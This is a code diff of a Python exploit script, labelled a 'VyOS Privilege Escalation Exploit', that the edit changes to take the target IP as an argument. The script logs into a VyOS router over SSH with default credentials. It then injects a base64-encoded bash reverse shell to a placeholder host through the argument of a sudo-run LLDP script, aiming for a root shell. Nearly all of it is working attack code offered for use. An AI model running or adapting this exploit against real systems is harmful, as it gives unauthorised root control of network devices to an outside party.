@@ -1,17 +1,22 @@
 import base64
 import paramiko
 import time
+import argparse
 
 # User settings
-RHOST = '10.10.10.201'
 RPORT = 22
 USERNAME = 'vyos'
 PASSWORD = 'vyos'
 
+# Replace with your actual IP and port for the reverse shell
 payload_cmd = "bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1"
 
 def main():
-    
+    parser = argparse.ArgumentParser(description="VyOS Privilege Escalation Exploit")
+    parser.add_argument("-t", "--target", required=True, help="Target IP address")
+    args = parser.parse_args()
+    RHOST = args.target
+
     payload_b64 = base64.b64encode(payload_cmd.encode()).decode()
 
     ssh = paramiko.SSHClient()
@@ -20,7 +25,6 @@ def main():
     ssh.connect(RHOST, port=RPORT, username=USERNAME, password=PASSWORD, look_for_keys=False, allow_agent=False)
     print("[+] Connected.")
 
-    
     chan = ssh.invoke_shell()
     time.sleep(1)
 
@@ -49,14 +53,12 @@ def main():
     print("[*] After breakout attempt:")
     print(output)
 
-
     exploit_cmd = f"sudo /opt/vyatta/bin/sudo-users/vyatta-show-lldp.pl -action show-neighbor -i ';echo {payload_b64}|base64 -d|/bin/sh'\n"
 
     print("[*] Sending privilege escalation payload...")
     chan.send(exploit_cmd)
 
     time.sleep(3)
-
     print("[*] You may now have root shell (try whoami):")
 
     try:
